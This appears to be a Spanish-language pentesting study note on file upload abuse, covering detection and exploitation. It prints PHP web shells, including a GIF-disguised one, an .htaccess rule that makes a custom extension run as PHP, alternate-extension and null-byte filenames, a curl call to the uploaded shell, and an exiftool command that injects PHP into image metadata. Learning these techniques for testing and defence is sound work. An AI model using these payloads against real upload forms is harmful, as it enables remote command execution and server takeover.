# Abuso de subidas de archivos

***

* Tags: #OWASP\_TOP\_10 #vulnerabilidad #hacking #file\_upload #exploiting

***

## Definición

> El **abuso de subida de archivos** es una vulnerabilidad de seguridad que ocurre cuando un atacante carga intencionadamente archivos maliciosos en un sistema o aplicación web que permite a los usuarios cargar archivos. Esto puede conducir a consecuencias graves, como la ejecución de código malicioso en el servidor, la propagación de malware, o la manipulación de datos. La falta de controles adecuados de seguridad en la subida de archivos puede permitir que los atacantes exploten esta vulnerabilidad para comprometer la integridad y la disponibilidad del sistema afectado.
>
> Si por ejemplo el atacante consigue subir un archivo PHP y el servidor web lo almacena, podría conseguir ejecución remota de comandos y tomar el control del servidor.
>
> Se suelen utilizar técnicas de **falsificación de tipos de archivos** para engañar a una aplicación web con el objetivo de que acepte un archivo malicioso como si fuera un archivo legítimo.

***

## Detección de vulnerabilidad

* **Evaluación de la interfaz de carga**: Prueba la interfaz de carga de archivos de la página web en busca de debilidades. Intenta cargar archivos con extensiones maliciosas o tamaños inusualmente grandes.
* **Exploración de parámetros de solicitud**: Utiliza herramientas de desarrollo del navegador o aplicaciones como \[\[Burpsuite]] para examinar las solicitudes HTTP relacionadas con la carga de archivos.
* **Prueba de carga de archivos maliciosos**: Intenta cargar archivos que contengan código malicioso, como archivos con scripts o malware incrustado.
* **Pruebas de carga de archivos múltiples**: Intenta cargar varios archivos a la vez para ver si la aplicación web maneja adecuadamente esta carga múltiple. Algunas vulnerabilidades pueden surgir cuando la aplicación no valida correctamente la carga de varios archivos simultáneamente.

***

## Explotación

Pueden darse distintos tipos y vías de ataque dependiendo del tipo de sanitización que esté empleando el servidor web. Comenzamos con el caso en el que no hay ninguna restricción a la hora de subir archivos, donde podemos subir un script en **php** (suponiendo que en la aplicación web se interprete php) como el siguiente:

```php
<?
	system($_GET['cmd']);
?>
```

Deberíamos usar el parámetro para ejecutar las instrucciones que nos plazca.

### Validación a nivel de navegador

Si la validación que se realiza al archivo subido se hace desde nuestro navegador, es decir, se utiliza un script al que tenemos acceso para controlar las extensiones de los archivos, podemos eliminar la restricción desde el propio navegador.

En el siguiente ejemplo, se utiliza una función para validar si el archivo es correcto, por lo que podemos eliminarla directamente para burlar la validación (se tendría que eliminar desde onsubmit hasta el final):

!\[\[Pasted image 20231008214641.png]]

### Validación a nivel de servidor

Si la validación se realiza desde el propio servidor, podemos intentar distintas vías de ataque, dependiendo del nivel de sanitización de la aplicación web.

#### Cambio de extensión del archivo

Puede ser que la aplicación web bloqueé algunos tipos de extensiones, pero podemos probar con los diferentes tipos de extensiones que pueden ser establecidas para un archivo, pudiendo resultar en un caso exitoso. Algunos ejemplos de cambio de extensiones posibles son los siguientes:

* **PHP**: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module.
* **ASP**: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml.

Los cambios de extensión los realizaremos interceptando la petición desde \[\[Burpsuite]].

#### Crear nueva política para interpretar extensiones a nuestro gusto (.htaccess)

Frente a validaciones que se estén aplicando evitando introducir extensiones típicas, podemos utilizar el archivo **.htaccess** para decirle al servidor que interprete una extensión que nos plazca. Así podemos subir un archivo con dicha extensión para proceder con la explotación. Para ello, podemos subir un archivo llamado **.htaccess** con el siguiente contenido:

```
AddType application/x-httpd-php .test
```

De manera que ahora se interpretarán los archivos con extensión _.test_ como un script **php**.

#### Restricción de tamaño de envío

Puede darse el caso en el que la aplicación web no permite la subida de archivos mayores a cierto tamaño, por lo que nos impide introducir ciertos scripts más grandes de lo esperado. Esta validación se puede realizar también desde el propio navegador, de manera que si interceptamos la petición con \[\[Burpsuite]] y vemos que el tamaño máximo permitido está hardcodeado, podemos simplemente aumentarlo y debería funcionar.

En el caso en el que no se esté realizando la validación por el lado del servidor, podemos tratar de reducir nuestro script lo máximo posible. Suponiendo que estamos utilizando un script como el visto al principio de la sección, podemos reducirlo bastante:

```php
<?=`$_GET[0]`?>
```

Si no funcionase, también podríamos probar con lo siguiente:

```php
<?php system($_GET[0]);?>
```

#### Restricción con el tipo de archivo (magic numbers)

Cuando una aplicación web verifica que el archivo subido tiene la extensión deseada, se podría estar realizando a través de la cabecera de la petición _Content-Type_, de manera que si no está la deseada, no se sube el archivo correctamente. Si se está realizando esta sanitización, podemos probar simplemente con cambiar la cabecera a la que espera la aplicación web. Por ejemplo, si la aplicación espera una imagen y hemos subido un archivo **php**, la cabecera tendrá el valor _Content-Type: application/x-php_, pero si la modificamos a la deseada _Content-Type: image/jpg_ puede ser que el servidor la acepte.

Pasamos ahora a hablar de los **magic numbers**, que son secuencias específicas de bytes ubicadas al comienzo de un archivo que se utilizan para identificar el tipo o formato del archivo. Estas secuencias sirven como marcas distintivas que permiten a sistemas operativos y aplicaciones reconocer el tipo de archivo, independientemente de su extensión o nombre. Cada tipo de archivo tiene su propio número mágico característico. Podemos encontrar los **magic numbers** asociados a cada archivo en [Wikipedia](https://en.wikipedia.org/wiki/List\_of\_file\_signatures).

Suponiendo que la validación que se está realizando la archivo subido es a través de los **magic numbers**, si cambiamos los mismos de un archivo podría funcionar y que la aplicación acepte el archivo, además de modificar el campo de _Content-Type_ mencionado anteriormente. Si tomamos como ejemplo el script mencionado anteriormente, pero queremos hacerlo pasar por un _GIF_, el script quedaría de la siguiente manera:

```php
GIF8;

<?
	system($_GET['cmd']);
?>
```

En este caso, para introducir los **magic numbers** podemos hacerlo con un editor cualquiera de texto, pero si los bytes que tenemos que introducir no son legibles, tendremos que hacer uso de alguna herramienta que trabaje con hexadecimales, como por ejemplo **xxd**.

#### Ataques de doble extensión

Podemos tratar de burlar la validación del archivo añadiendo la extensión válida antes de la extensión de ejecución, además de concatenarla con las posibles extensiones mencionadas al inicio de la página. Además, podemos intentar añadir un _null-byte_, y jugar con todas las maneras. De esta manera que los archivos podrían quedar de la siguiente manera:

* file.png.php
* file.png.Php5
* file.php%00
* file.png.pHp5
* file.php%00.png
* ...

#### Evitar descarga de archivo

Una vez hayamos subido nuestro archivo, puede ser que la única manera de visualizar el mismo sea descargándolo, de manera que si es un script, no podemos ejecutarlo. Para evitar la descarga, podemos hacer una petición a través de la consola con _curl_:

```bash
curl -s -X GET "http://ruta/a/cmd.php" -G --data-urlencode "cmd=<COMANDO>"
```

#### Metadatos de una archivo

Un **metadato** es una información que describe o proporciona datos sobre otros datos, son detalles que ofrecen contexto y significado a la información principal. Para visualizar los **metadatos** de una archivo, podemos utilizar \[\[ExifTool]].

Una vez conocido el concepto, lo podemos utilizar para inyectar código malicioso en un archivo que queramos subir, de manera que si en el servidor se procesa la foto, puede ser que se ejecute el código introducido. Para ello podemos ejecutar el siguiente comando:

```bash
exiftool -Comment='<?php system("<COMANDO>")'
```

***

## Ejemplos prácticos

* [file\_upload\_vulnerability\_scenarios](https://github.com/moeinfatehi/file\_upload\_vulnerability\_scenarios)
